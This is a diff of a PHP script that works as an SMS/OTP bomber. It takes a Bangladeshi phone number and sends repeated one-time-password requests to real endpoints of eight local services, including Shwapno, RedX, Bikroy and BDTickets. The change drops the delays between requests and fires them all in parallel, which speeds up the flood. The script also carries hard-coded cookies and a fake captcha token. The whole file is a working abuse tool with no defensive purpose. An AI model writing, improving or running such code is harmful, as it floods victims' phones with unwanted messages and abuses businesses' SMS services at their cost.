@@ -1,170 +1,159 @@
 <?php
 header('Content-Type: application/json');
-set_time_limit(0); 
-error_reporting(0); // কোনো ওয়ার্নিং যেন আউটপুট নষ্ট না করে
+error_reporting(E_ALL);
+ini_set('display_errors',1);
 
+// Validate phone
 $phone = $_GET['phone'] ?? '';
-if(empty($phone)) {
-    die(json_encode(["status" => "error", "message" => "Phone number missing. Use ?phone=017XXXXXXXX"]));
+if(!preg_match('/^(?:\+?88)?01[3-9]\d{8}$/', $phone)){
+    die(json_encode(["status" => "error", "message" => "Invalid phone number. Use 01XXXXXXXXX"]));
 }
 
-// ফোন নাম্বার ফরমেটিং
-$phone_11 = (substr($phone, 0, 2) === "88") ? substr($phone, 2) : $phone;
-if(substr($phone_11, 0, 1) !== "0") { $phone_11 = "0".$phone_11; } // নিশ্চিত করা যেন ১১ ডিজিট হয়
+// Phone normalization
+$phone_11 = preg_replace('/^\+?88/', '', $phone);
+if(substr($phone_11,0,1)!=="0") $phone_11 = "0".$phone_11;
+$phone_88 = "88".$phone_11;
+$phone_plus88 = "+88".$phone_11;
 
-$phone_88 = "88" . $phone_11;
-$phone_plus88 = "+88" . $phone_11;
+// Prepare all API requests
+$api_requests = [];
 
-$results = [];
-
-// ১. Shwapno (৫ বার)
-for($i=1; $i<=5; $i++){
-    sleep(rand(3, 5));
-    $ch = curl_init();
-    curl_setopt_array($ch, [
-        CURLOPT_URL => 'https://www.shwapno.com/api/auth',
-        CURLOPT_RETURNTRANSFER => true,
-        CURLOPT_SSL_VERIFYPEER => false,
-        CURLOPT_CUSTOMREQUEST => 'POST',
-        CURLOPT_POSTFIELDS => json_encode(["phoneNumber" => $phone_plus88]),
-        CURLOPT_HTTPHEADER => [
+// 1. Shwapno (5 times)
+for($i=1;$i<=5;$i++){
+    $api_requests[] = [
+        "name"=>"shwapno_$i",
+        "url"=>"https://www.shwapno.com/api/auth",
+        "data"=>["phoneNumber"=>$phone_plus88],
+        "headers"=>[
             'Content-Type: application/json',
             'User-Agent: Mozilla/5.0 (Linux; Android 10)',
-            'origin: https://www.shwapno.com',
-            'referer: https://www.shwapno.com/',
-            'cookie: cuid=98a49521-6662-498f-94eb-17d71974083f; _nc_=true; _ds_=65eb62a4452e887cd78e256b'
-        ],
-    ]);
-    $res = curl_exec($ch);
-    $results["shwapno_$i"] = json_decode($res, true) ?: "Sent";
-    curl_close($ch);
+            'Origin: https://www.shwapno.com',
+            'Referer: https://www.shwapno.com/',
+            'Cookie: cuid=98a49521-6662-498f-94eb-17d71974083f; _nc_=true; _ds_=65eb62a4452e887cd78e256b'
+        ]
+    ];
 }
 
-// ২. Garibook (৫ বার)
-for($i=1; $i<=5; $i++){
-    sleep(rand(3, 5));
-    $ch = curl_init();
-    curl_setopt_array($ch, [
-        CURLOPT_URL => 'https://api.garibookadmin.com/api/v4/user/login',
-        CURLOPT_RETURNTRANSFER => true,
-        CURLOPT_SSL_VERIFYPEER => false,
-        CURLOPT_POST => 1,
-        CURLOPT_POSTFIELDS => json_encode(["mobile" => $phone_plus88, "recaptcha_token" => "garibookcaptcha", "channel" => "web"]),
-        CURLOPT_HTTPHEADER => [
+// 2. Garibook (5 times)
+for($i=1;$i<=5;$i++){
+    $api_requests[] = [
+        "name"=>"garibook_$i",
+        "url"=>"https://api.garibookadmin.com/api/v4/user/login",
+        "data"=>["mobile"=>$phone_plus88,"recaptcha_token"=>"garibookcaptcha","channel"=>"web"],
+        "headers"=>[
             'Content-Type: application/json',
             'User-Agent: Mozilla/5.0 (Linux; Android 10)',
             'Origin: https://garibook.com',
             'Referer: https://garibook.com/'
-        ],
-    ]);
-    $res = curl_exec($ch);
-    $results["garibook_$i"] = json_decode($res, true) ?: "Sent";
-    curl_close($ch);
+        ]
+    ];
 }
 
-// ৩. Shikho (৩ বার)
-for($i=1; $i<=3; $i++){
-    sleep(rand(2, 4));
-    $ch = curl_init();
-    curl_setopt_array($ch, [
-        CURLOPT_URL => 'https://api.shikho.com/auth/v2/send/sms',
-        CURLOPT_RETURNTRANSFER => true,
-        CURLOPT_SSL_VERIFYPEER => false,
-        CURLOPT_POST => 1,
-        CURLOPT_POSTFIELDS => json_encode(["phone" => $phone_88, "type" => "student", "auth_type" => "signup"]),
-        CURLOPT_HTTPHEADER => ['Content-Type: application/json', 'Origin: https://shikho.com']
-    ]);
-    $res = curl_exec($ch);
-    $results["shikho_$i"] = json_decode($res, true) ?: "Sent";
-    curl_close($ch);
+// 3. Shikho (3 times)
+for($i=1;$i<=3;$i++){
+    $api_requests[] = [
+        "name"=>"shikho_$i",
+        "url"=>"https://api.shikho.com/auth/v2/send/sms",
+        "data"=>["phone"=>$phone_88,"type"=>"student","auth_type"=>"signup"],
+        "headers"=>['Content-Type: application/json','Origin: https://shikho.com']
+    ];
 }
 
-// ৪. RedX (১০ বার)
-for($i=1; $i<=10; $i++){
-    sleep(rand(2, 4));
-    $ch = curl_init();
-    curl_setopt_array($ch, [
-        CURLOPT_URL => 'https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp',
-        CURLOPT_RETURNTRANSFER => true,
-        CURLOPT_SSL_VERIFYPEER => false,
-        CURLOPT_POST => 1,
-        CURLOPT_POSTFIELDS => json_encode(["phoneNumber" => $phone_11]),
-        CURLOPT_HTTPHEADER => ['Content-Type: application/json']
-    ]);
-    $res = curl_exec($ch);
-    $results["redx_$i"] = json_decode($res, true) ?: "Sent";
-    curl_close($ch);
+// 4. RedX (10 times)
+for($i=1;$i<=10;$i++){
+    $api_requests[] = [
+        "name"=>"redx_$i",
+        "url"=>"https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp",
+        "data"=>["phoneNumber"=>$phone_11],
+        "headers"=>['Content-Type: application/json']
+    ];
 }
 
-// ৫. Bikroy (১০ বার)
-for($i=1; $i<=10; $i++){
-    sleep(rand(2, 4));
-    $ch = curl_init();
-    curl_setopt_array($ch, [
-        CURLOPT_URL => "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=$phone_11",
-        CURLOPT_RETURNTRANSFER => true,
-        CURLOPT_SSL_VERIFYPEER => false,
-        CURLOPT_HTTPHEADER => ['User-Agent: Mozilla/5.0']
-    ]);
-    $res = curl_exec($ch);
-    $results["bikroy_$i"] = json_decode($res, true) ?: "Sent";
-    curl_close($ch);
+// 5. Bikroy (10 times)
+for($i=1;$i<=10;$i++){
+    $api_requests[] = [
+        "name"=>"bikroy_$i",
+        "url"=>"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=$phone_11",
+        "data"=>[],
+        "headers"=>['User-Agent: Mozilla/5.0']
+    ];
 }
 
-// ৬. PBS (৫ বার)
-for($i=1; $i<=5; $i++){
-    sleep(rand(2, 4));
-    $ch = curl_init();
-    curl_setopt_array($ch, [
-        CURLOPT_URL => 'https://apialpha.pbs.com.bd/api/OTP/generateOTP',
-        CURLOPT_RETURNTRANSFER => true,
-        CURLOPT_SSL_VERIFYPEER => false,
-        CURLOPT_POST => 1,
-        CURLOPT_POSTFIELDS => json_encode(["userPhone" => $phone_11]),
-        CURLOPT_HTTPHEADER => ['Content-Type: application/json']
-    ]);
-    $res = curl_exec($ch);
-    $results["pbs_$i"] = json_decode($res, true) ?: "Sent";
-    curl_close($ch);
+// 6. PBS (5 times)
+for($i=1;$i<=5;$i++){
+    $api_requests[] = [
+        "name"=>"pbs_$i",
+        "url"=>"https://apialpha.pbs.com.bd/api/OTP/generateOTP",
+        "data"=>["userPhone"=>$phone_11],
+        "headers"=>['Content-Type: application/json']
+    ];
 }
 
-// ৭. Iqra Live (৩ বার)
-for($i=1; $i<=3; $i++){
-    sleep(rand(2, 4));
-    $ch = curl_init();
-    curl_setopt_array($ch, [
-        CURLOPT_URL => "https://apibeta.iqra-live.com/api/v2/sent-otp/".$phone_11,
-        CURLOPT_RETURNTRANSFER => true,
-        CURLOPT_SSL_VERIFYPEER => false,
-        CURLOPT_HTTPHEADER => ['User-Agent: Mozilla/5.0']
-    ]);
-    $res = curl_exec($ch);
-    $results["iqra_$i"] = json_decode($res, true) ?: "Sent";
-    curl_close($ch);
+// 7. Iqra Live (3 times)
+for($i=1;$i<=3;$i++){
+    $api_requests[] = [
+        "name"=>"iqra_$i",
+        "url"=>"https://apibeta.iqra-live.com/api/v2/sent-otp/".$phone_11,
+        "data"=>[],
+        "headers"=>['User-Agent: Mozilla/5.0']
+    ];
 }
 
-// ৮. BDTickets (১০ বার)
-for($i=1; $i<=10; $i++){
-    sleep(rand(6, 9)); 
-    $ch = curl_init();
-    curl_setopt_array($ch, [
-        CURLOPT_URL => 'https://api.bdtickets.com:20100/v1/auth',
-        CURLOPT_RETURNTRANSFER => true,
-        CURLOPT_SSL_VERIFYPEER => false,
-        CURLOPT_POST => 1,
-        CURLOPT_POSTFIELDS => json_encode(["createUserCheck" => true, "phoneNumber" => $phone_plus88, "applicationChannel" => "WEB_APP"]),
-        CURLOPT_HTTPHEADER => [
+// 8. BDTickets (10 times)
+for($i=1;$i<=10;$i++){
+    $api_requests[] = [
+        "name"=>"bdtickets_$i",
+        "url"=>"https://api.bdtickets.com:20100/v1/auth",
+        "data"=>["createUserCheck"=>true,"phoneNumber"=>$phone_plus88,"applicationChannel"=>"WEB_APP"],
+        "headers"=>[
             'Content-Type: application/json',
-            'Host: api.bdtickets.com:20100',
-            'Origin: https://bdtickets.com',
-            'Referer: https://bdtickets.com/',
             'User-Agent: Mozilla/5.0 (Linux; Android 10)'
-        ],
+        ]
+    ];
+}
+
+// Parallel cURL execution
+$results = [];
+$multiCurl = [];
+$mh = curl_multi_init();
+
+// Initialize cURL handles
+foreach($api_requests as $key => $api){
+    $ch = curl_init();
+    curl_setopt_array($ch,[
+        CURLOPT_URL => $api['url'],
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_POST => true,
+        CURLOPT_POSTFIELDS => json_encode($api['data']),
+        CURLOPT_HTTPHEADER => $api['headers'],
+        CURLOPT_TIMEOUT => 20,
+        CURLOPT_SSL_VERIFYPEER => true
     ]);
-    $res = curl_exec($ch);
-    $results["bdtickets_$i"] = json_decode($res, true) ?: "Sent";
+    $multiCurl[$key] = $ch;
+    curl_multi_add_handle($mh,$ch);
+}
+
+// Execute all in parallel
+$running = null;
+do {
+    curl_multi_exec($mh,$running);
+    curl_multi_select($mh);
+} while($running > 0);
+
+// Collect results
+foreach($multiCurl as $key => $ch){
+    $res = curl_multi_getcontent($ch);
+    $error = curl_error($ch);
+    $http = curl_getinfo($ch,CURLINFO_HTTP_CODE);
+    $results[$api_requests[$key]['name']] = [
+        "status_code"=>$http,
+        "error"=>$error ?: null,
+        "response"=>$res
+    ];
+    curl_multi_remove_handle($mh,$ch);
     curl_close($ch);
 }
 
-echo json_encode(["status" => "completed", "results" => $results], JSON_PRETTY_PRINT);
-?>
+curl_multi_close($mh);
+
+echo json_encode(["status"=>"completed","results"=>$results], JSON_PRETTY_PRINT);
